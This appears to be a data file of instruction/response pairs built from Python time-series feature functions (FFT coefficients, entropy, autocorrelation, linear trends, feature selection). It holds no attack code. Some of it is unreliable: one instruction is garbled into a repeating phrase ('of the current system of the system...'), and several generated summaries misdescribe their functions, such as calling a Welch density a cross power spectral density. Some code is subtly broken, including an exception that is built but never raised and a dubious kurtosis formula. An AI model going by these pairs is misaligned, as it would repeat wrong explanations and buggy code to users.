{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncalculate the fourier coefficients of a one - dimensional discrete Fourier Transform for real input by fast fourier transformation algorithm.", "response": "def fft_coefficient(x, param):\n    \"\"\"\n    Calculates the fourier coefficients of the one-dimensional discrete Fourier Transform for real input by fast\n    fourier transformation algorithm\n\n    .. math::\n        A_k =  \\\\sum_{m=0}^{n-1} a_m \\\\exp \\\\left \\\\{ -2 \\\\pi i \\\\frac{m k}{n} \\\\right \\\\}, \\\\qquad k = 0,\n        \\\\ldots , n-1.\n\n    The resulting coefficients will be complex, this feature calculator can return the real part (attr==\"real\"),\n    the imaginary part (attr==\"imag), the absolute value (attr=\"\"abs) and the angle in degrees (attr==\"angle).\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param param: contains dictionaries {\"coeff\": x, \"attr\": s} with x int and x >= 0, s str and in [\"real\", \"imag\",\n        \"abs\", \"angle\"]\n    :type param: list\n    :return: the different feature values\n    :return type: pandas.Series\n    \"\"\"\n\n    assert min([config[\"coeff\"] for config in param]) >= 0, \"Coefficients must be positive or zero.\"\n    assert set([config[\"attr\"] for config in param]) <= set([\"imag\", \"real\", \"abs\", \"angle\"]), \\\n        'Attribute must be \"real\", \"imag\", \"angle\" or \"abs\"'\n\n    fft = np.fft.rfft(x)\n\n    def complex_agg(x, agg):\n        if agg == \"real\":\n            return x.real\n        elif agg == \"imag\":\n            return x.imag\n        elif agg == \"abs\":\n            return np.abs(x)\n        elif agg == \"angle\":\n            return np.angle(x, deg=True)\n\n    res = [complex_agg(fft[config[\"coeff\"]], config[\"attr\"]) if config[\"coeff\"] < len(fft)\n           else np.NaN for config in param]\n    index = ['coeff_{}__attr_\"{}\"'.format(config[\"coeff\"], config[\"attr\"]) for config in param]\n    return zip(index, res)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncalculates the spectral centroid variance skew and kurtosis of the absolute fourier transform spectrum.", "response": "def fft_aggregated(x, param):\n    \"\"\"\n    Returns the spectral centroid (mean), variance, skew, and kurtosis of the absolute fourier transform spectrum.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param param: contains dictionaries {\"aggtype\": s} where s str and in [\"centroid\", \"variance\",\n        \"skew\", \"kurtosis\"]\n    :type param: list\n    :return: the different feature values\n    :return type: pandas.Series\n    \"\"\"\n\n    assert set([config[\"aggtype\"] for config in param]) <= set([\"centroid\", \"variance\", \"skew\", \"kurtosis\"]), \\\n        'Attribute must be \"centroid\", \"variance\", \"skew\", \"kurtosis\"'\n\n\n    def get_moment(y, moment):\n        \"\"\"\n        Returns the (non centered) moment of the distribution y:\n        E[y**moment] = \\sum_i[index(y_i)^moment * y_i] / \\sum_i[y_i]\n        \n        :param y: the discrete distribution from which one wants to calculate the moment \n        :type y: pandas.Series or np.array\n        :param moment: the moment one wants to calcalate (choose 1,2,3, ... )\n        :type moment: int\n        :return: the moment requested\n        :return type: float\n        \"\"\"\n        return y.dot(np.arange(len(y))**moment) / y.sum()\n\n    def get_centroid(y):\n        \"\"\"\n        :param y: the discrete distribution from which one wants to calculate the centroid \n        :type y: pandas.Series or np.array\n        :return: the centroid of distribution y (aka distribution mean, first moment)\n        :return type: float \n        \"\"\"\n        return get_moment(y, 1)\n\n    def get_variance(y):\n        \"\"\"\n        :param y: the discrete distribution from which one wants to calculate the variance \n        :type y: pandas.Series or np.array\n        :return: the variance of distribution y\n        :return type: float \n        \"\"\"\n        return get_moment(y, 2) - get_centroid(y) ** 2\n\n    def get_skew(y):\n        \"\"\"\n        Calculates the skew as the third standardized moment.\n        Ref: https://en.wikipedia.org/wiki/Skewness#Definition\n        \n        :param y: the discrete distribution from which one wants to calculate the skew \n        :type y: pandas.Series or np.array\n        :return: the skew of distribution y\n        :return type: float \n        \"\"\"\n\n        variance = get_variance(y)\n        # In the limit of a dirac delta, skew should be 0 and variance 0.  However, in the discrete limit,\n        # the skew blows up as variance --> 0, hence return nan when variance is smaller than a resolution of 0.5:\n        if variance < 0.5:\n            return np.nan\n        else:\n            return (\n                get_moment(y, 3) - 3*get_centroid(y)*variance - get_centroid(y)**3\n            ) / get_variance(y)**(1.5)\n\n    def get_kurtosis(y):\n        \"\"\"\n        Calculates the kurtosis as the fourth standardized moment.\n        Ref: https://en.wikipedia.org/wiki/Kurtosis#Pearson_moments\n        \n        :param y: the discrete distribution from which one wants to calculate the kurtosis \n        :type y: pandas.Series or np.array\n        :return: the kurtosis of distribution y\n        :return type: float \n        \"\"\"\n\n        variance = get_variance(y)\n        # In the limit of a dirac delta, kurtosis should be 3 and variance 0.  However, in the discrete limit,\n        # the kurtosis blows up as variance --> 0, hence return nan when variance is smaller than a resolution of 0.5:\n        if variance < 0.5:\n            return np.nan\n        else:\n            return (\n                get_moment(y, 4) - 4*get_centroid(y)*get_moment(y, 3)\n                + 6*get_moment(y, 2)*get_centroid(y)**2 - 3*get_centroid(y)\n            ) / get_variance(y)**2\n\n    calculation = dict(\n        centroid=get_centroid,\n        variance=get_variance,\n        skew=get_skew,\n        kurtosis=get_kurtosis\n    )\n\n    fft_abs = np.abs(np.fft.rfft(x))\n\n    res = [calculation[config[\"aggtype\"]](fft_abs) for config in param]\n    index = ['aggtype_\"{}\"'.format(config[\"aggtype\"]) for config in param]\n    return zip(index, res)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncalculates the number of peaks of at least support n in the time series x.", "response": "def number_peaks(x, n):\n    \"\"\"\n    Calculates the number of peaks of at least support n in the time series x. A peak of support n is defined as a\n    subsequence of x where a value occurs, which is bigger than its n neighbours to the left and to the right.\n\n    Hence in the sequence\n\n    >>> x = [3, 0, 0, 4, 0, 0, 13]\n\n    4 is a peak of support 1 and 2 because in the subsequences\n\n    >>> [0, 4, 0]\n    >>> [0, 0, 4, 0, 0]\n\n    4 is still the highest value. Here, 4 is not a peak of support 3 because 13 is the 3th neighbour to the right of 4\n    and its bigger than 4.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param n: the support of the peak\n    :type n: int\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    x_reduced = x[n:-n]\n\n    res = None\n    for i in range(1, n + 1):\n        result_first = (x_reduced > _roll(x, i)[n:-n])\n\n        if res is None:\n            res = result_first\n        else:\n            res &= result_first\n\n        res &= (x_reduced > _roll(x, -i)[n:-n])\n    return np.sum(res)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef index_mass_quantile(x, param):\n\n    x = np.asarray(x)\n    abs_x = np.abs(x)\n    s = sum(abs_x)\n\n    if s == 0:\n        # all values in x are zero or it has length 0\n        return [(\"q_{}\".format(config[\"q\"]), np.NaN) for config in param]\n    else:\n        # at least one value is not zero\n        mass_centralized = np.cumsum(abs_x) / s\n        return [(\"q_{}\".format(config[\"q\"]),\n                (np.argmax(mass_centralized >= config[\"q\"])+1)/len(x)) for config in param]", "response": "This function calculates the relative index i where q% of the mass of the time series x lie left of i."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncalculate a linear least-squares regression for the values of the time series versus the sequence from 0 to length of the time series minus one. This feature assumes the signal to be uniformly sampled. It will not use the time stamps to fit the model. The parameters control which of the characteristics are returned. Possible extracted attributes are \"pvalue\", \"rvalue\", \"intercept\", \"slope\", \"stderr\", see the documentation of linregress for more information. :param x: the time series to calculate the feature of :type x: numpy.ndarray :param param: contains dictionaries {\"attr\": x} with x an string, the attribute name of the regression model :type param: list :return: the different feature values :return type: pandas.Series", "response": "def linear_trend(x, param):\n    \"\"\"\n    Calculate a linear least-squares regression for the values of the time series versus the sequence from 0 to\n    length of the time series minus one.\n    This feature assumes the signal to be uniformly sampled. It will not use the time stamps to fit the model.\n    The parameters control which of the characteristics are returned.\n\n    Possible extracted attributes are \"pvalue\", \"rvalue\", \"intercept\", \"slope\", \"stderr\", see the documentation of\n    linregress for more information.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param param: contains dictionaries {\"attr\": x} with x an string, the attribute name of the regression model\n    :type param: list\n    :return: the different feature values\n    :return type: pandas.Series\n    \"\"\"\n    # todo: we could use the index of the DataFrame here\n    linReg = linregress(range(len(x)), x)\n\n    return [(\"attr_\\\"{}\\\"\".format(config[\"attr\"]), getattr(linReg, config[\"attr\"]))\n            for config in param]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cwt_coefficients(x, param):\n\n    calculated_cwt = {}\n    res = []\n    indices = []\n\n    for parameter_combination in param:\n        widths = parameter_combination[\"widths\"]\n        w = parameter_combination[\"w\"]\n        coeff = parameter_combination[\"coeff\"]\n\n        if widths not in calculated_cwt:\n            calculated_cwt[widths] = cwt(x, ricker, widths)\n\n        calculated_cwt_for_widths = calculated_cwt[widths]\n\n        indices += [\"widths_{}__coeff_{}__w_{}\".format(widths, coeff, w)]\n\n        i = widths.index(w)\n        if calculated_cwt_for_widths.shape[1] <= coeff:\n            res += [np.NaN]\n        else:\n            res += [calculated_cwt_for_widths[i, coeff]]\n\n    return zip(indices, res)", "response": "Calculates the Continuous wavelet transform for the Ricker wavelet transform."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef spkt_welch_density(x, param):\n\n    freq, pxx = welch(x, nperseg=min(len(x), 256))\n    coeff = [config[\"coeff\"] for config in param]\n    indices = [\"coeff_{}\".format(i) for i in coeff]\n\n    if len(pxx) <= np.max(coeff):  # There are fewer data points in the time series than requested coefficients\n\n        # filter coefficients that are not contained in pxx\n        reduced_coeff = [coefficient for coefficient in coeff if len(pxx) > coefficient]\n        not_calculated_coefficients = [coefficient for coefficient in coeff\n                                       if coefficient not in reduced_coeff]\n\n        # Fill up the rest of the requested coefficients with np.NaNs\n        return zip(indices, list(pxx[reduced_coeff]) + [np.NaN] * len(not_calculated_coefficients))\n    else:\n        return zip(indices, pxx[coeff])", "response": "This function calculates the cross power spectral density of the time series x at different frequencies."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef change_quantiles(x, ql, qh, isabs, f_agg):\n    if ql >= qh:\n        ValueError(\"ql={} should be lower than qh={}\".format(ql, qh))\n\n    div = np.diff(x)\n    if isabs:\n        div = np.abs(div)\n    # All values that originate from the corridor between the quantiles ql and qh will have the category 0,\n    # other will be np.NaN\n    try:\n        bin_cat = pd.qcut(x, [ql, qh], labels=False)\n        bin_cat_0 = bin_cat == 0\n    except ValueError:  # Occurs when ql are qh effectively equal, e.g. x is not long enough or is too categorical\n        return 0\n    # We only count changes that start and end inside the corridor\n    ind = (bin_cat_0 & _roll(bin_cat_0, 1))[1:]\n    if sum(ind) == 0:\n        return 0\n    else:\n        ind_inside_corridor = np.where(ind == 1)\n        aggregator = getattr(np, f_agg)\n        return aggregator(div[ind_inside_corridor])", "response": "This function fixes a corridor given by the quantiles ql and qh of the distribution of x and calculates the average absolute value of consecutive changes of the series x inside the corridor."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef c3(x, lag):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    n = x.size\n    if 2 * lag >= n:\n        return 0\n    else:\n        return np.mean((_roll(x, 2 * -lag) * _roll(x, -lag) * x)[0:(n - 2 * lag)])", "response": "This function calculates the value of the next nonlinearity in a time series."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncompute the binned entropy of a time series.", "response": "def binned_entropy(x, max_bins):\n    \"\"\"\n    First bins the values of x into max_bins equidistant bins.\n    Then calculates the value of\n\n    .. math::\n\n        - \\\\sum_{k=0}^{min(max\\\\_bins, len(x))} p_k log(p_k) \\\\cdot \\\\mathbf{1}_{(p_k > 0)}\n\n    where :math:`p_k` is the percentage of samples in bin :math:`k`.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param max_bins: the maximal number of bins\n    :type max_bins: int\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    hist, bin_edges = np.histogram(x, bins=max_bins)\n    probs = hist / x.size\n    return - np.sum(p * np.math.log(p) for p in probs if p != 0)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef sample_entropy(x):\n    x = np.array(x)\n\n    sample_length = 1 # number of sequential points of the time series\n    tolerance = 0.2 * np.std(x) # 0.2 is a common value for r - why?\n\n    n = len(x)\n    prev = np.zeros(n)\n    curr = np.zeros(n)\n    A = np.zeros((1, 1))  # number of matches for m = [1,...,template_length - 1]\n    B = np.zeros((1, 1))  # number of matches for m = [1,...,template_length]\n\n    for i in range(n - 1):\n        nj = n - i - 1\n        ts1 = x[i]\n        for jj in range(nj):\n            j = jj + i + 1\n            if abs(x[j] - ts1) < tolerance:  # distance between two vectors\n                curr[jj] = prev[jj] + 1\n                temp_ts_length = min(sample_length, curr[jj])\n                for m in range(int(temp_ts_length)):\n                    A[m] += 1\n                    if j < n - 1:\n                        B[m] += 1\n            else:\n                curr[jj] = 0\n        for j in range(nj):\n            prev[j] = curr[j]\n\n    N = n * (n - 1) / 2\n    B = np.vstack(([N], B[0]))\n\n    # sample entropy = -1 * (log (A/B))\n    similarity_ratio = A / B\n    se = -1 * np.log(similarity_ratio)\n    se = np.reshape(se, -1)\n    return se[0]", "response": "Calculate and return sample entropy of a time series."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncalculating the autocorrelation of the specified lag.", "response": "def autocorrelation(x, lag):\n    \"\"\"\n    Calculates the autocorrelation of the specified lag, according to the formula [1]\n\n    .. math::\n\n        \\\\frac{1}{(n-l)\\sigma^{2}} \\\\sum_{t=1}^{n-l}(X_{t}-\\\\mu )(X_{t+l}-\\\\mu)\n\n    where :math:`n` is the length of the time series :math:`X_i`, :math:`\\sigma^2` its variance and :math:`\\mu` its\n    mean. `l` denotes the lag.\n\n    .. rubric:: References\n\n    [1] https://en.wikipedia.org/wiki/Autocorrelation#Estimation\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param lag: the lag\n    :type lag: int\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    # This is important: If a series is passed, the product below is calculated\n    # based on the index, which corresponds to squaring the series.\n    if type(x) is pd.Series:\n        x = x.values\n    if len(x) < lag:\n        return np.nan\n    # Slice the relevant subseries based on the lag\n    y1 = x[:(len(x)-lag)]\n    y2 = x[lag:]\n    # Subtract the mean of the whole series x\n    x_mean = np.mean(x)\n    # The result is sometimes referred to as \"covariation\"\n    sum_product = np.sum((y1 - x_mean) * (y2 - x_mean))\n    # Return the normalized unbiased covariance\n    v = np.var(x)\n    if np.isclose(v, 0):\n        return np.NaN\n    else:\n        return sum_product / ((len(x) - lag) * v)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef quantile(x, q):\n    x = pd.Series(x)\n    return pd.Series.quantile(x, q)", "response": "Calculates the q quantile of x."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef number_crossing_m(x, m):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    # From https://stackoverflow.com/questions/3843017/efficiently-detect-sign-changes-in-python\n    positive = x > m\n    return np.where(np.bitwise_xor(positive[1:], positive[:-1]))[0].size", "response": "Calculates the number of crossings of x on m."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef value_count(x, value):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n\n    if np.isnan(value):\n        return np.isnan(x).sum()\n    else:\n        return x[x == value].size", "response": "Count occurrences of value in time series x."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncount observed values within the interval [ min max ).", "response": "def range_count(x, min, max):\n    \"\"\"\n    Count observed values within the interval [min, max).\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param min: the inclusive lower bound of the range\n    :type min: int or float\n    :param max: the exclusive upper bound of the range\n    :type max: int or float\n    :return: the count of values within the range\n    :rtype: int\n    \"\"\"\n    return np.sum((x >= min) & (x < max))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef approximate_entropy(x, m, r):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n\n    N = x.size\n    r *= np.std(x)\n    if r < 0:\n        raise ValueError(\"Parameter r must be positive.\")\n    if N <= m+1:\n        return 0\n\n    def _phi(m):\n        x_re = np.array([x[i:i+m] for i in range(N - m + 1)])\n        C = np.sum(np.max(np.abs(x_re[:, np.newaxis] - x_re[np.newaxis, :]),\n                          axis=2) <= r, axis=0) / (N-m+1)\n        return np.sum(np.log(C)) / (N - m + 1.0)\n\n    return np.abs(_phi(m) - _phi(m + 1))", "response": "This method calculates the approximate entropy of a time series with a given level."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncalculating the friedrich coefficients of the current system of the system of the current system of the current system of the current system of the current system of the current system.", "response": "def friedrich_coefficients(x, param):\n    \"\"\"\n    Coefficients of polynomial :math:`h(x)`, which has been fitted to\n    the deterministic dynamics of Langevin model\n\n    .. math::\n        \\dot{x}(t) = h(x(t)) + \\mathcal{N}(0,R)\n\n    as described by [1].\n\n    For short time-series this method is highly dependent on the parameters.\n\n    .. rubric:: References\n\n    |  [1] Friedrich et al. (2000): Physics Letters A 271, p. 217-222\n    |  *Extracting model equations from experimental data*\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param param: contains dictionaries {\"m\": x, \"r\": y, \"coeff\": z} with x being positive integer, the order of polynom to fit for estimating fixed points of\n                    dynamics, y positive float, the number of quantils to use for averaging and finally z, a positive integer corresponding to the returned\n                    coefficient\n    :type param: list\n    :return: the different feature values\n    :return type: pandas.Series\n    \"\"\"\n    calculated = {}  # calculated is dictionary storing the calculated coefficients {m: {r: friedrich_coefficients}}\n    res = {}  # res is a dictionary containg the results {\"m_10__r_2__coeff_3\": 15.43}\n\n    for parameter_combination in param:\n        m = parameter_combination['m']\n        r = parameter_combination['r']\n        coeff = parameter_combination[\"coeff\"]\n\n        assert coeff >= 0, \"Coefficients must be positive or zero. Found {}\".format(coeff)\n\n        # calculate the current friedrich coefficients if they do not exist yet\n        if m not in calculated:\n            calculated[m] = {r: _estimate_friedrich_coefficients(x, m, r)}\n        else:\n            if r not in calculated[m]:\n                calculated[m] = {r: _estimate_friedrich_coefficients(x, m, r)}\n\n        try:\n            res[\"m_{}__r_{}__coeff_{}\".format(m, r, coeff)] = calculated[m][r][coeff]\n        except IndexError:\n            res[\"m_{}__r_{}__coeff_{}\".format(m, r, coeff)] = np.NaN\n    return [(key, value) for key, value in res.items()]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef max_langevin_fixed_point(x, r, m):\n\n    coeff = _estimate_friedrich_coefficients(x, m, r)\n\n    try:\n        max_fixed_point = np.max(np.real(np.roots(coeff)))\n    except (np.linalg.LinAlgError, ValueError):\n        return np.nan\n\n    return max_fixed_point", "response": "Estimate the maximum fixed point of the deterministic dynamics of Langevin model."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncalculate a linear least - squares regression for values of the time series x.", "response": "def agg_linear_trend(x, param):\n    \"\"\"\n    Calculates a linear least-squares regression for values of the time series that were aggregated over chunks versus\n    the sequence from 0 up to the number of chunks minus one.\n\n    This feature assumes the signal to be uniformly sampled. It will not use the time stamps to fit the model.\n\n    The parameters attr controls which of the characteristics are returned. Possible extracted attributes are \"pvalue\",\n    \"rvalue\", \"intercept\", \"slope\", \"stderr\", see the documentation of linregress for more information.\n\n    The chunksize is regulated by \"chunk_len\". It specifies how many time series values are in each chunk.\n\n    Further, the aggregation function is controlled by \"f_agg\", which can use \"max\", \"min\" or , \"mean\", \"median\"\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param param: contains dictionaries {\"attr\": x, \"chunk_len\": l, \"f_agg\": f} with x, f an string and l an int\n    :type param: list\n    :return: the different feature values\n    :return type: pandas.Series\n    \"\"\"\n    # todo: we could use the index of the DataFrame here\n\n    calculated_agg = {}\n    res_data = []\n    res_index = []\n\n    for parameter_combination in param:\n\n        chunk_len = parameter_combination[\"chunk_len\"]\n        f_agg = parameter_combination[\"f_agg\"]\n\n        aggregate_result = _aggregate_on_chunks(x, f_agg, chunk_len)\n        if f_agg not in calculated_agg or chunk_len not in calculated_agg[f_agg]:\n            if chunk_len >= len(x):\n                calculated_agg[f_agg] = {chunk_len: np.NaN}\n            else:\n                lin_reg_result = linregress(range(len(aggregate_result)), aggregate_result)\n                calculated_agg[f_agg] = {chunk_len: lin_reg_result}\n\n        attr = parameter_combination[\"attr\"]\n\n        if chunk_len >= len(x):\n            res_data.append(np.NaN)\n        else:\n            res_data.append(getattr(calculated_agg[f_agg][chunk_len], attr))\n\n        res_index.append(\"f_agg_\\\"{}\\\"__chunk_len_{}__attr_\\\"{}\\\"\".format(f_agg, chunk_len, attr))\n\n    return zip(res_index, res_data)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef energy_ratio_by_chunks(x, param):\n    res_data = []\n    res_index = []\n    full_series_energy = np.sum(x ** 2)\n\n    for parameter_combination in param:\n        num_segments = parameter_combination[\"num_segments\"]\n        segment_focus = parameter_combination[\"segment_focus\"]\n        assert segment_focus < num_segments\n        assert num_segments > 0\n\n        res_data.append(np.sum(np.array_split(x, num_segments)[segment_focus] ** 2.0)/full_series_energy)\n        res_index.append(\"num_segments_{}__segment_focus_{}\".format(num_segments, segment_focus))\n\n    return list(zip(res_index, res_data))", "response": "Calculates the sum of squares of chunk i out of N chunks expressed as a ratio with the sum of squares over the whole series."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef linear_trend_timewise(x, param):\n    ix = x.index\n\n    # Get differences between each timestamp and the first timestamp in seconds.\n    # Then convert to hours and reshape for linear regression\n    times_seconds = (ix - ix[0]).total_seconds()\n    times_hours = np.asarray(times_seconds / float(3600))\n\n    linReg = linregress(times_hours, x.values)\n\n    return [(\"attr_\\\"{}\\\"\".format(config[\"attr\"]), getattr(linReg, config[\"attr\"]))\n            for config in param]", "response": "This function calculates a linear least - squares regression for the values of the time series versus the sequence from 0 to length of the time series minus one."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fit(self, X, y):\n        if not isinstance(X, pd.DataFrame):\n            X = pd.DataFrame(X.copy())\n\n        if not isinstance(y, pd.Series):\n            y = pd.Series(y.copy())\n\n        relevance_table = calculate_relevance_table(\n                                X, y, ml_task=self.ml_task, n_jobs=self.n_jobs,\n                                chunksize=self.chunksize, fdr_level=self.fdr_level,\n                                hypotheses_independent=self.hypotheses_independent,\n                                test_for_binary_target_real_feature=self.test_for_binary_target_real_feature)\n        self.relevant_features = relevance_table.loc[relevance_table.relevant].feature.tolist()\n        self.feature_importances_ = 1.0 - relevance_table.p_value.values\n        self.p_values = relevance_table.p_value.values\n        self.features = relevance_table.index.tolist()\n\n        return self", "response": "This method calculates the relevance table for the given features and returns the fitted estimator with the information which features are relevant."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef transform(self, X):\n        if self.relevant_features is None:\n            raise RuntimeError(\"You have to call fit before.\")\n\n        if isinstance(X, pd.DataFrame):\n            return X.copy().loc[:, self.relevant_features]\n        else:\n            return X[:, self.relevant_features]", "response": "Delete all features which were not relevant in the fit phase."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef download_har_dataset():\n\n    zipurl = 'https://github.com/MaxBenChrist/human-activity-dataset/blob/master/UCI%20HAR%20Dataset.zip?raw=true'\n\n    if os.path.exists(data_file_name_dataset) and os.path.exists(data_file_name_classes):\n        _logger.warning(\"You have already downloaded the Human Activity Data Set.\")\n        return\n\n    with urlopen(zipurl) as zipresp:\n        with ZipFile(BytesIO(zipresp.read())) as zfile:\n            zfile.extractall(path=data_file_name)\n        zfile.close()", "response": "Download the Human Activity Recognition Dataset from UCI ML Repository and store it at the data_file_name_dataset and data_file_name_classes."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds the features calculated using the timeseries_container and add them to the corresponding rows in the input pandas.DataFrame X. To save some computing time, you should only include those time serieses in the container, that you need. You can set the timeseries container with the method :func:`set_timeseries_container`. :param X: the DataFrame to which the calculated timeseries features will be added. This is *not* the dataframe with the timeseries itself. :type X: pandas.DataFrame :return: The input DataFrame, but with added features. :rtype: pandas.DataFrame", "response": "def transform(self, X):\n        \"\"\"\n        Add the features calculated using the timeseries_container and add them to the corresponding rows in the input\n        pandas.DataFrame X.\n\n        To save some computing time, you should only include those time serieses in the container, that you\n        need. You can set the timeseries container with the method :func:`set_timeseries_container`.\n\n        :param X: the DataFrame to which the calculated timeseries features will be added. This is *not* the\n               dataframe with the timeseries itself.\n        :type X: pandas.DataFrame\n\n        :return: The input DataFrame, but with added features.\n        :rtype: pandas.DataFrame\n        \"\"\"\n        if self.timeseries_container is None:\n            raise RuntimeError(\"You have to provide a time series using the set_timeseries_container function before.\")\n\n        # Extract only features for the IDs in X.index\n        timeseries_container_X = restrict_input_to_index(self.timeseries_container, self.column_id, X.index)\n\n        extracted_features = extract_features(timeseries_container_X,\n                                              default_fc_parameters=self.default_fc_parameters,\n                                              kind_to_fc_parameters=self.kind_to_fc_parameters,\n                                              column_id=self.column_id, column_sort=self.column_sort,\n                                              column_kind=self.column_kind, column_value=self.column_value,\n                                              chunksize=self.chunksize,\n                                              n_jobs=self.n_jobs, show_warnings=self.show_warnings,\n                                              disable_progressbar=self.disable_progressbar,\n                                              impute_function=self.impute_function,\n                                              profile=self.profile,\n                                              profiling_filename=self.profiling_filename,\n                                              profiling_sorting=self.profiling_sorting)\n\n        X = pd.merge(X, extracted_features, left_index=True, right_index=True, how=\"left\")\n\n        return X"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fit(self, X, y):\n        if self.timeseries_container is None:\n            raise RuntimeError(\"You have to provide a time series using the set_timeseries_container function before.\")\n\n        self.feature_extractor.set_timeseries_container(self.timeseries_container)\n\n        if self.filter_only_tsfresh_features:\n            # Do not merge the time series features to the old features\n            X_tmp = pd.DataFrame(index=X.index)\n        else:\n            X_tmp = X\n\n        X_augmented = self.feature_extractor.transform(X_tmp)\n\n        self.col_to_max, self.col_to_min, self.col_to_median = get_range_values_per_column(X_augmented)\n        X_augmented = impute_dataframe_range(X_augmented, col_to_max=self.col_to_max, col_to_median=self.col_to_median,\n                                             col_to_min=self.col_to_min)\n\n        self.feature_selector.fit(X_augmented, y)\n\n        return self", "response": "Fits the estimator with the information of the features of X and y."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncalculate the relevance table for the features contained in feature matrix X with respect to target vector y.", "response": "def calculate_relevance_table(X, y, ml_task='auto', n_jobs=defaults.N_PROCESSES, chunksize=defaults.CHUNKSIZE,\n                   test_for_binary_target_binary_feature=defaults.TEST_FOR_BINARY_TARGET_BINARY_FEATURE,\n                   test_for_binary_target_real_feature=defaults.TEST_FOR_BINARY_TARGET_REAL_FEATURE,\n                   test_for_real_target_binary_feature=defaults.TEST_FOR_REAL_TARGET_BINARY_FEATURE,\n                   test_for_real_target_real_feature=defaults.TEST_FOR_REAL_TARGET_REAL_FEATURE,\n                   fdr_level=defaults.FDR_LEVEL, hypotheses_independent=defaults.HYPOTHESES_INDEPENDENT):\n    \"\"\"\n    Calculate the relevance table for the features contained in feature matrix `X` with respect to target vector `y`.\n    The relevance table is calculated for the intended machine learning task `ml_task`.\n\n    To accomplish this for each feature from the input pandas.DataFrame an univariate feature significance test\n    is conducted. Those tests generate p values that are then evaluated by the Benjamini Hochberg procedure to\n    decide which features to keep and which to delete.\n\n    We are testing\n\n        :math:`H_0` = the Feature is not relevant and should not be added\n\n    against\n\n        :math:`H_1` = the Feature is relevant and should be kept\n\n    or in other words\n\n        :math:`H_0` = Target and Feature are independent / the Feature has no influence on the target\n\n        :math:`H_1` = Target and Feature are associated / dependent\n\n    When the target is binary this becomes\n\n        :math:`H_0 = \\\\left( F_{\\\\text{target}=1} = F_{\\\\text{target}=0} \\\\right)`\n\n        :math:`H_1 = \\\\left( F_{\\\\text{target}=1} \\\\neq F_{\\\\text{target}=0} \\\\right)`\n\n    Where :math:`F` is the distribution of the target.\n\n    In the same way we can state the hypothesis when the feature is binary\n\n        :math:`H_0 =  \\\\left( T_{\\\\text{feature}=1} = T_{\\\\text{feature}=0} \\\\right)`\n\n        :math:`H_1 = \\\\left( T_{\\\\text{feature}=1} \\\\neq T_{\\\\text{feature}=0} \\\\right)`\n\n    Here :math:`T` is the distribution of the target.\n\n    TODO: And for real valued?\n\n    :param X: Feature matrix in the format mentioned before which will be reduced to only the relevant features.\n              It can contain both binary or real-valued features at the same time.\n    :type X: pandas.DataFrame\n\n    :param y: Target vector which is needed to test which features are relevant. Can be binary or real-valued.\n    :type y: pandas.Series or numpy.ndarray\n\n    :param ml_task: The intended machine learning task. Either `'classification'`, `'regression'` or `'auto'`.\n                    Defaults to `'auto'`, meaning the intended task is inferred from `y`.\n                    If `y` has a boolean, integer or object dtype, the task is assumend to be classification,\n                    else regression.\n    :type ml_task: str\n\n    :param test_for_binary_target_binary_feature: Which test to be used for binary target, binary feature (currently unused)\n    :type test_for_binary_target_binary_feature: str\n\n    :param test_for_binary_target_real_feature: Which test to be used for binary target, real feature\n    :type 